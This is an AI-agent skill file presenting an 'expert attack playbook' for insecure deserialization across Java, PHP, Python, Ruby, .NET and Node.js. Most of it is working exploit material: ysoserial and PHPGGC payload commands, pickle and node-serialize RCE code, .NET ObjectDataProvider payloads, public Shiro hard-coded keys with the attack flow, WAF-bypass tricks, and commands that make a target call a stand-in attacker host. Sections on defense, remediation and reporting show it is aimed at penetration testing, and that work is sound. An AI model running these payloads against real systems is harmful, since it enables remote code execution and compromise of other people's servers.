---
name: deserialization-insecure
description: >-
  Insecure deserialization playbook. Use when Java, PHP, or Python applications deserialize untrusted data via ObjectInputStream, unserialize, pickle, or similar mechanisms that may lead to RCE, file access, or privilege escalation.
---

# SKILL: Insecure Deserialization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert deserialization techniques across Java, PHP, and Python. Covers gadget chain selection, traffic fingerprinting, tool usage (ysoserial, PHPGGC), Shiro/WebLogic/Commons Collections specifics, Phar deserialization, and Python pickle abuse. Base models often miss the distinction between finding the sink and finding a usable gadget chain.

## 0. RELATED ROUTING

- [jndi-injection](../jndi-injection/SKILL.md) when deserialization leads to JNDI lookup (e.g., post-JDK 8u191 bypass via LDAP → deserialization)
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) when the deserialization endpoint is an exposed management service (RMI Registry, T3, AJP)
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when a WAF blocks your BCEL ClassLoader or Fastjson `@type` payload — Ghost Bits wraps each bytecode byte in a Unicode char whose low 8 bits match, yielding a payload the WAF cannot fingerprint

### Advanced Reference

Also load [JAVA_GADGET_CHAINS.md](./JAVA_GADGET_CHAINS.md) when you need:
- Java gadget chain version compatibility matrix (CommonsCollections 1–7, CommonsBeanutils, Spring, JDK-only, Groovy, Hibernate, ROME, C3P0, etc.)
- SnakeYAML gadget (ScriptEngineManager/URLClassLoader) with exploit JAR structure
- Hessian/Kryo/Avro/XStream deserialization patterns and traffic fingerprints
- .NET ViewState deserialization (machineKey requirement, ViewState forgery with ysoserial.net, Blacklist3r)
- Ruby YAML.load vs YAML.safe_load exploitation with version-specific chains
- Detection fingerprints: magic bytes table by format (Java `AC ED`, .NET `AAEAAD`, Python pickle `80 0N`, PHP `O:`, Ruby `04 08`)

---

## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex `ac ed 00 05` | Raw binary in request/response body, cookies, POST params |
| Base64 `rO0AB` | Cookies (`rememberMe`), hidden form fields, JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| `O:NUMBER:"ClassName"` pattern | POST body, cookies, session files |
| `a:NUMBER:{` (array) | Same locations |
| `phar://` URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex `80 03` or `80 04` (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| `pickle.loads` / `pickle.load` in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

```bash
# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)
```

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains.

### Commons Collections — The Classic Chain

The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.

Key classes in the chain: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → triggers `Runtime.exec()` during deserialization.

### Apache Shiro — rememberMe Deserialization

Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.

```text
Known hard-coded keys (SHIRO-550 / CVE-2016-4437):
kPH+bIxk5D2deZiIxcaaaA==          # most common default
wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**Attack flow**:
1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session
2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)
3. AES-CBC encrypt with known key + random IV
4. Base64-encode → set as `rememberMe` cookie value
5. Send request → server decrypts → deserializes → RCE

**DNSLog confirmation** (before full RCE): use URLDNS chain → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → encrypt → set cookie → check DNSLog for hit.

**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721).

### WebLogic Deserialization

Multiple vectors:
- **T3 protocol** (port 7001): direct serialized object injection
- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`
- **IIOP protocol**: alternative to T3

```bash
# T3 probe — check if T3 is exposed:
nmap -sV -p 7001 TARGET
# Look for: "T3" or "WebLogic" in service banner
```

### Java RMI Registry

RMI Registry (port 1099) accepts serialized objects by design:

```bash
# ysoserial exploit module for RMI:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# Requires: vulnerable library on target's classpath
# Works on: JDK <= 8u111 without JEP 290 deserialization filter
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121-8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

---

## 3. PHP — unserialize AND PHAR

### Magic Method Chain

PHP deserialization triggers magic methods in order:

```
__wakeup()  → called immediately on unserialize()
__destruct() → called when object is garbage-collected
__toString() → called when object is used as string
__call()     → called for inaccessible methods
```

**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF).

### Serialized Object Format

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin Configuration Injection (Real-World Case)

phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# List available chains:
phpggc -l

# Generate payload (example: Laravel RCE):
phpggc Laravel/RCE1 system id

# Common chains:
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar Deserialization

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called.

**Triggering functions** (partial list):
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**Attack flow**:
1. Upload a valid file (e.g., JPEG with phar polyglot)
2. Trigger file operation: `file_exists("phar://uploads/avatar.jpg")`
3. PHP deserializes phar metadata → gadget chain executes

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ Method

Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send payload to target that calls pickle.loads()
```

### Analyzing Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# Shows opcodes: GLOBAL, REDUCE, etc.
# Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
```

### Common Python Deserialization Sinks

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML without Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### Defensive Bypass: RestrictedUnpickler

Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

If `safe_builtins` includes `eval`, `exec`, or `__import__` → still exploitable.

---

## 5. DETECTION METHODOLOGY

```
Found binary blob or encoded object in request/cookie?
├── Java signature (ac ed / rO0AB)?
│   ├── Use URLDNS probe for safe confirmation
│   ├── Identify libraries (error messages, known product)
│   └── Try ysoserial chains matching identified libraries
│
├── PHP signature (O:N:"...)?
│   ├── Identify framework (Laravel, Symfony, WordPress)
│   ├── Try PHPGGC chains for that framework
│   └── Check for phar:// wrapper in file operations
│
├── Python (opaque binary, base64 blob)?
│   ├── Try pickle payload with DNS callback
│   └── Check if PyYAML unsafe load is used
│
└── Not sure?
    ├── Try URLDNS payload (Java) — check DNS
    ├── Try PHP serialized test string
    └── Monitor error messages for class loading failures
```

---

## 6. DEFENSE AWARENESS

| Language | Mitigation |
|---|---|
| Java | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf instead |
| PHP | Avoid `unserialize()` on user input; use `json_decode()` instead; block `phar://` in file operations |
| Python | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always use `yaml.safe_load()` |

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```text
# Java — URLDNS confirmation
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — RCE via CommonsCollections
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro default key test
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY DESERIALIZATION

### Ruby Marshal

- `Marshal.load` on untrusted data → RCE
- Fingerprint: binary data, no common text header
- Gadget chains exist for various Ruby versions
- Docker verification: hex payload via `[hex_string].pack("H*")`

### Ruby YAML (YAML.load)

- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects
- **Pre Ruby 2.7.2**: `Gem::Requirement` chain → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step)
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation check
- Payload template:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe

---

## 9. .NET DESERIALIZATION

- **Traffic fingerprint**:
  - BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)
  - ViewState: hex `FF01` or `/w` prefix
  - JSON.NET: `$type` property in JSON
- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation
- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML
- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`
- **JSON.NET**: `$type` property enables type control → `ObjectDataProvider` + `ExpandedWrapper` chains

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
  ```

- **Tool**: `ysoserial.net` — generate payloads for all .NET formatters

  ```text
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
  ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc"
  ```

- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`

---

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---

## 11. GADGET CHAIN SELECTION — VERSION COMPATIBILITY

**A deserialization endpoint is not a finding until a chain fires.** Finding the sink is the
easy half; the half that decides whether you have RCE or a `ClassNotFoundException` is
matching a gadget to the exact library versions on the classpath. Most dead ends in this
domain are version mismatches, not a hardened target.

### 14.1 The version table

| Chain | Requires | Breaks when | Notes |
|---|---|---|---|
| `CommonsCollections1` | Commons Collections 3.1 | 3.2.2+ hardened `InvokerTransformer` serialization | needs `sun.reflect.annotation.AnnotationInvocationHandler`, so < 8u71 |
| `CommonsCollections2` | Commons Collections 4.0 | 4.1 with `SerializationSupport` flags | `PriorityQueue` + `TransformingComparator` |
| `CommonsCollections3` | CC 3.1 | as CC1 | `TrAXFilter`/`TemplatesImpl`, no `AnnotationInvocationHandler` |
| `CommonsCollections4` | CC 4.0 | as CC2 | CC2 trigger + CC3 sink |
| `CommonsCollections5` | CC 3.1 | 3.2.2+ | `BadAttributeValueExpException`, works past 8u71 |
| `CommonsCollections6` | CC 3.1 | 3.2.2+ | `HashSet`/`TiedMapEntry` — **the default choice** |
| `CommonsCollections7` | CC 3.1 | 3.2.2+ | `Hashtable`/`LazyMap` |
| `CommonsBeanutils1` | commons-beanutils ≤ 1.9.2 | 1.9.4 | no Collections dependency at all |
| `Spring1`/`Spring2` | spring-core + spring-beans | version-specific | `MethodInvokeTypeProvider` |
| `Groovy1` | groovy ≤ 2.4.3 | 2.4.4+ | `MethodClosure` → `ConvertedClosure` |
| `Hibernate1`/`Hibernate2` | Hibernate 4/5 | — | `Getter`/`PojoInputStreamResolver` |
| `JBossInterceptors1` | JBoss Interceptors 1.0 | — | also needs `javassist` |
| `Jdk7u21` | JDK 7u21 only | 7u25+ | zero third-party dependencies |
| `URLDNS` | **nothing** | — | DNS-only probe; works on every JDK |

### 14.2 Reading the classpath without a shell

You rarely get `ls` on the target. Infer it:

- **Verbose error leak** — a stack trace naming the failing class tells you what was loaded *before* the failure; classes that resolved are present.
- **Product fingerprint** — WebLogic ships a known Commons Collections version per patch level; JBoss ships `JBossInterceptors`; a Spring Boot fat JAR ships whatever `spring-boot-dependencies` pinned.
- **Dependency confusion in the response** — `X-Powered-By`, error page boilerplate, and `Server` versions correlate to a dependency kit.
- **Timing differential per chain** — a chain that resolves gadgets but fails later costs more milliseconds than one that dies on the first class load. This is a coarse but real oracle.

### 14.3 Chain selection order

```
1. URLDNS                     — confirm the sink with zero risk and zero dependencies
2. CommonsCollections6        — the workhorse for CC 3.1
3. CommonsBeanutils1          — when Commons Collections is absent
4. CommonsCollections4/2      — when the app ships CC 4.x
5. Spring1/Groovy1/Hibernate1 — when the product fingerprint matches
6. Jdk7u21                    — when there is literally nothing else on the classpath
```

**Use `URLDNS` first, every time.** Fewer than five seconds of execution, no RCE, no
destructive side effect, and it proves the sink. A `DNS` hit collapses an entire class of
uncertainty before you spend an hour on chain compatibility.

**Prefer a non-`Runtime.exec` sink when the target is sensitive.** A DNS callback or a file
write to a throwaway path proves execution with a smaller blast radius than a reverse shell.
You can escalate once the report is written.

### 14.4 Reporting the version matrix

State which library versions you **assumed** versus **proved**. "The app uses WebLogic
12.2.1.4, which ships Commons Collections 3.2.2, which is patched for CC1/CC6 but not for
CC5" is a verifiable claim. "Some deserialization chain probably works" is not.

---

## 12. WAF AND FILTER BYPASS

**Filters in this domain operate at four distinct layers, and they are not interchangeable.**

### 15.1 Class-name blacklists (JEP 290 / `ObjectInputFilter`)

The most common mitigation after a disclosed CVE. Two ways through:

- **Gadget substitution** — the blacklist names `InvokerTransformer`; use `CommonsBeanutils1`, `Spring1`, or a JDK-only chain. Blacklists are almost always built from the last CVE, not from first principles.
- **`Class` object transfer** — send the gadget's `Class` object and invoke its constructor later, so the stream never contains the literal name the filter matches.

### 15.2 Byte-level WAF signatures

Border WAFs match on the serialized magic bytes or on the known tool's output shape:

```bash
# Strip the Java serialization magic (some sinks re-add it, some do not)
java -jar ysoserial.jar CommonsCollections6 "id" | tail -c +5 | base64 -w0

# Encode the whole payload with a wrapper the app itself decodes (gzip, then base64)
java -jar ysoserial.jar CommonsCollections6 "id" | gzip -9 | base64 -w0
```

**Ghost Bits is the modern general bypass** when the WAF is byte-pattern matching. Each
bytecode byte is wrapped in a Unicode codepoint whose low 8 bits preserve the original, so
the WAF sees no known signature while the application normalizes back to the working
payload. See [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md).

### 15.3 Application-layer content filters

Look for the tell that a filter runs *before* deserialization:

- **`Content-Type` enforcement** — a JSON-only endpoint that errors on binary but accepts `application/x-java-serialized-object` on a sibling route.
- **Length caps** — a 512-byte body limit on a parameter that normally holds a JWT.
- **Character-set scrubbing** — payload survives only when the cookie value is base64 `rO0AB` and the raw hex form is rejected.
- **Double-decode** — a base64 layer inside a base64 layer; the filter decodes once.

### 15.4 What to report when the WAF holds

A blocked payload is **not** a finding. What you report is the **unfiltered sibling**: the
same sink reached through a route the WAF does not cover — an internal T3 port, a different
protocol (IIOP versus T3), a secondary endpoint with the same `ObjectInputStream`, or a
non-HTTP path such as a message queue. Prove the filter is route-scoped, not
product-scoped. That distinction is the whole finding.

---

## 13. END-TO-END EXECUTION WALKTHROUGH

```bash
# ── STEP 0 — scope check ────────────────────────────────────────────────
# Confirm the target is in scope and note the assessment window. Everything
# below is a live execution against a real sink.

# ── STEP 1 — fingerprint the sink (safe) ────────────────────────────────
curl -s -i https://TARGET/ -H 'Cookie: rememberMe=deleteMe' | grep -i 'set-cookie'
# rememberMe=deleteMe in the response = the cookie was parsed and rejected.

# ── STEP 2 — confirm via DNS only (safe, URLDNS) ────────────────────────
java -jar ysoserial.jar URLDNS "http://DESER-1.oast.pro" > probe.bin
# Shiro: AES-CBC encrypt with the known key, then base64.
# Verify the DNS hit BEFORE doing anything else. If there is no hit, stop:
# you do not have a sink, and no chain will change that.

# ── STEP 3 — identify the classpath ─────────────────────────────────────
# Force an error and read the class names it leaks.
curl -s -i https://TARGET/ -H 'Cookie: rememberMe='"$(base64 -w0 probe.bin)"

# ── STEP 4 — select and generate the chain ──────────────────────────────
java -jar ysoserial.jar CommonsCollections6 "nslookup DESER-2.oast.pro" > p2.bin
# A DNS-based command proves RCE without a reverse shell. Prefer it.

# ── STEP 5 — deliver ────────────────────────────────────────────────────
# Shiro: encrypt + base64, set as rememberMe.
# Raw Java: POST with Content-Type: application/x-java-serialized-object.

# ── STEP 6 — escalate, then stop ────────────────────────────────────────
# Command execution confirmed → capture id/whoami output, note the user and
# host, then CLOSE the test. Do not establish persistence on a client.

# ── STEP 7 — negative control ───────────────────────────────────────────
# Send a SERIALIZED-BUT-INERT object (a plain HashMap) to the same sink.
# A 200 means the endpoint deserializes everything → the sink is confirmed
# independently of any gadget. A 500 on both proves the sink is absent and
# the DNS hit came from somewhere else.
```

**The DNS callback is your proof of the sink; command output is your proof of RCE.**
Report them as two separate verifications — the first can be SOLID while the second is only
PLAUSIBLE if output does not come back in-band.

---

## 14. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| RCE on a confirmed sink with command output captured | **Critical (P1)** | the out-of-band command response, plus the payload used |
| RCE via a gadget chain proven by DNS/execution only | **Critical (P1)** | the callback log plus the payload; state the missing in-band output |
| Deserialization sink confirmed with `URLDNS` but no chain found | **Medium (P3)** | the DNS hit plus the request; state the unresolved classpath |
| Unauthenticated endpoint with a hard-coded crypto key (e.g. SHIRO-550) | **Critical (P1)** | the key, the decrypt, and the resulting deserialization |
| Phar deserialization reachable through a user-controlled `phar://` | **High (P2)** | the upload plus the triggering file operation |
| Unsafe `pickle.loads` / `yaml.load` in reviewed source, reachable from a route | **High (P2)** | file path + line number + the reachable route |
| `ObjectInputStream` on untrusted data with a narrow class blacklist | **Medium (P3)** | the sink plus a chain that bypasses the blacklist |
| Deserialization limited to primitive types, no object graph | **Informational (P5)** | the parse path shows no `readObject` of custom classes |
| A base64 blob that merely looks serialized | **Not a finding** | decode it — `rO0AB` absent means no Java stream |

**A working RCE where you can only prove the DNS callback is still P1, but say so.** An
unproven RCE is not a lesser bug, it is a lesser *report* — mark the output as
UNVERIFIABLE-by-access, never inflate it to "full compromise demonstrated".

---

## 15. CONFIRMING THE FINDING
Deserialization's discipline: **an intercepted byte stream is not code execution, and a gadget chain
that exists is not a gadget chain that ran.** This table is the gate.

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the **stream captured verbatim**, with its content type and the endpoint? | the artefact is the stream, and it must be reproducible |
| 2 | Was the **format identified by the bytes**, not by a parameter's name? | `viewstate`, a Java magic, a PHP `O:`, a Python pickle opcode |
| 3 | Did the chain **actually execute**, with an observable effect? | a gadget chain's existence is a capability, not an execution |
| 4 | Is there a **control**: a benign object of the same format that does NOT trigger the effect? | the difference is the finding |
| 5 | Is the **sink reachable** unauthenticated, or is a precondition needed and stated? | "deserialization exists" without the path is a pattern |
| 6 | Did the effect arrive **out-of-band** where the response carries nothing? | an OOB callback at your collector is the proof |
| 7 | Was the **gadget's presence on the classpath** verified, not assumed from a library list? | a version match is a candidate; the chain either runs or it does not |

**A captured stream, a byte-identified format, an observed execution effect, and a benign-object control.**
A gadget chain's existence is a hypothesis; the effect is the finding.

---

---

## 16. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the exact endpoint, header, cookie, or parameter carrying the payload | the trigger |
| the tool and full command line that generated the payload | reproducibility |
| the payload itself, or its SHA-256 and the generator version | a payload that cannot be regenerated is not evidence |
| the callback log (DNS/HTTP) with timestamp and source IP | the sink proof, and it proves the target initiated it |
| command output captured out-of-band, if any | the RCE proof |
| the fingerprint that identified the sink | shows the method, not luck |
| the JDK and library versions, marked assumed versus proved | explains chain selection and failure modes |
| a **negative control**: an inert serialized object on the same sink | proves the sink deserializes, independent of the gadget |
| scope confirmation and the stopping point | this class is RCE-class; containment must be visible |

**The callback log is the single most important artefact.** It proves the target
deserialized and executed without any doubt about client-side behaviour, and it survives
even when nothing comes back in the response body.

**False positives to exclude:**

| Looks like deserialization | Actually |
|---|---|
| the base64 blob is long and binary | decode it — no `rO0AB` or `O:N:"` means no deserialization |
| a DNS hit after you sent a payload | check the timestamp and the query name; a browser prefetch or an unrelated resolver can produce a hit |
| an error mentioning `readObject` | a class-loading error, not necessarily a sink you can reach |
| the app crashed on your payload | a DoS, a different finding — and a possible unintentional outage; report honestly |
| `ysoserial` threw on your machine | your classpath discrepancy, not the target's behaviour |
| a gadget class exists in a dependency list | presence is not reachability; the sink must actually load it |
| the WAF returned a block page | no deserialization occurred server-side |

---

## 17. REMEDIATION REFERENCE

1. **Never deserialize untrusted data** — the only complete fix. Replace Java native serialization with JSON or Protobuf, and `unserialize()`/`pickle`/`YAML.load` with `json_decode()`/`json`/`safe_load`.
2. **Apply a JEP 290 `ObjectInputFilter` with an allowlist, not a blacklist** — reject by default, permit only the classes the application actually expects, and set depth, array-length, and reference limits.
3. **Rotate hard-coded crypto keys and eliminate them** — Shiro's default `kPH+bIxk5D2deZiIxcaaaA==` and friends are public. Generate per-deployment keys and bind them to a secret store, not to the cookie encryption only.
4. **Prefer signed, non-serialized session tokens** — a signed JWT with an explicit claim set removes the deserialization sink entirely rather than defending it.
5. **Bind every cookie value to the session and validate before decrypting** — a cookie that decrypts successfully is not authenticated; verify integrity and expiry first.
6. **Disable `phar://` and restrict PHP wrappers** — set `phar.readonly` appropriately, block `phar://` in file functions, and never pass user input to a path-consuming function.
7. **Keep the dependency tree patched** — Commons Collections ≥ 3.2.2 and ≥ 4.1, commons-beanutils ≥ 1.9.4, Groovy ≥ 2.4.4. Track CVEs for every gadget-capable library you ship.
8. **Never expose T3, IIOP, or RMI Registry to untrusted networks** — these protocols accept serialized objects by design. Filter at the network edge and treat the ports as management-plane.
9. **Log and alert on deserialization failures** — a stream that fails with `ClassNotFoundException` or `InvalidClassException` on an endpoint that should never receive binary data is a high-signal attack indicator.
10. **Test with a real serialized payload in CI** — assert that the endpoints which must not deserialize return a 4xx for `AC ED 00 05` and for a crafted PHP `O:N:` string, so a regression in a shared utility cannot silently reopen the sink.

---

## 18. EXECUTION PRIMITIVES

Deserialization findings are proven by **an out-of-band callback whose peer is the target, from a gadget
chain whose version compatibility was checked, with a non-vulnerable-form control**. A `500` on a mutated
blob is not deserialization; it is a parse error.

### 17.1 The format gate - is this actually deserialization?

```bash
# the first question is whether the parameter is deserialized at all, and in which language
T="https://target.example"
echo "=== STEP 1: the format fingerprint ==="
for P in 'O:8:"stdClass":0:{}' 'rO0ABX' 'gASV' '\x80\x04' 'AAEAAAD' '<java>' 'a:1:{i:0;s:1:"x";}'; do
  printf '%-28s ' "$P"
  curl -sS -o /tmp/d.out -w '%{http_code} %{size_download}B ' --data-urlencode "data=$P" "$T/deserialize"
  head -c 60 /tmp/d.out | tr -d '\n'; echo
done
echo
echo "=== STEP 2: the control - a WELL-FORMED value of the same shape ==="
# a valid serialized object of the app's own class must NOT error; if it also errors, the param
# is not deserialized and this is a parse/validation error, not a vulnerability
curl -sS -o /tmp/d.ok -w 'well-formed serialized: %{http_code} %{size_download}B\n' \
  --data-urlencode 'data=O:8:"stdClass":1:{s:1:"a";s:1:"b";}' "$T/deserialize"
curl -sS -o /tmp/d.bad -w 'truncated/garbage    : %{http_code} %{size_download}B\n' \
  --data-urlencode 'data=O:8:"stdClass":1:{s:1:' "$T/deserialize"
echo "  -> if BOTH error identically the parameter is parsed and rejected, not deserialized"
echo "  -> the fingerprint that matters: a VALID blob of the wrong CLASS produces a DIFFERENT error"
echo "     ('class not found' / 'unknown type') - that is the deserialization signature"
```

**The class-not-found error is the signature.** A generic parse error on both a valid and an invalid blob
means the parameter is not deserialized, and no gadget chain will help.

### 17.2 The OOB collector, which is the only proof of execution

```bash
# a deserialization RCE is proven by a callback whose PEER is the target. Nothing else qualifies.
COLL_PORT=8899
python3 - <<'PY'
import http.server, socketserver, threading, datetime, json, os
LOG="deser-callbacks.jsonl"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        rec={"t":datetime.datetime.now(datetime.timezone.utc).isoformat(),
             "peer":self.client_address[0],"path":self.path,
             "ua":self.headers.get("User-Agent",""),"host":self.headers.get("Host","")}
        open(LOG,"a").write(json.dumps(rec)+"\n"); print("CALLBACK:",json.dumps(rec))
        self.send_response(200); self.send_header("Content-Type","application/x-java-serialized-object")
        self.end_headers(); self.wfile.write(b"")
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
srv=socketserver.TCPServer(("0.0.0.0",8899),H)
threading.Thread(target=srv.serve_forever,daemon=True).start()
print("collector on :8899 ->",LOG)
print("THE PEER FIELD IS THE PROOF. A callback from your own IP means you triggered it.")
import time
while True: time.sleep(5)
PY
```

**A callback with the target's address in the peer field is the proof.** The collector logs peer, path, and
user agent, and the peer is what separates a real execution from your own test.

### 17.3 Java - ysoserial, with a compatibility check first

```bash
# every gadget chain has a version range. Check it BEFORE generating the payload.
COLL="coll.example:8899"
echo "=== the chain-to-version map (verify against the target's actual libraries) ==="
cat <<'CHAINS'
CommonsCollections1   -> Commons Collections 3.1 ONLY, JDK < 8u71
CommonsCollections2   -> Commons Collections 4.0, JDK any
CommonsCollections3   -> Commons Collections 3.1, JDK < 8u71
CommonsCollections4   -> Commons Collections 4.0, JDK any
CommonsCollections5   -> Commons Collections 3.1, JDK 8u76+ and 7u80+ TARGETED
CommonsCollections6   -> Commons Collections 3.1, JDK any  <-- the safest default
CommonsCollections7   -> Commons Collections 3.1, JDK any
CommonsBeanutils1     -> BeanUtils 1.9.2, JDK any
Groovy1               -> Groovy <= 2.4.3
Spring1 / Spring2     -> Spring Core, version sensitive
Hibernate1 / 2        -> Hibernate 4/5
JRMPClient            -> JDK any, needs a second-stage listener
URLDNS                -> JDK any, NO RCE - a DETECTION probe only
CHAINS
echo
echo "=== THE URLDNS PROBE: prove deserialization happens, with no execution ==="
# URLDNS resolves a hostname during deserialization. It is the SAFE first step: an OOB DNS
# interaction proves the sink without running any code.
java -jar ysoserial.jar URLDNS "http://deser-probe.$COLL/" > /tmp/urldns.ser 2>/dev/null
ls -l /tmp/urldns.ser
base64 -w0 /tmp/urldns.ser > /tmp/urldns.b64
echo "  -> send this first. A DNS interaction at your collector PROVES deserialization."
echo "  -> a DNS interaction is NOT RCE. Do not report it as RCE."
echo
echo "=== THEN the chain, chosen for the libraries you confirmed ==="
java -jar ysoserial.jar CommonsCollections6 "curl http://$COLL/java-cc6" > /tmp/cc6.ser 2>/dev/null
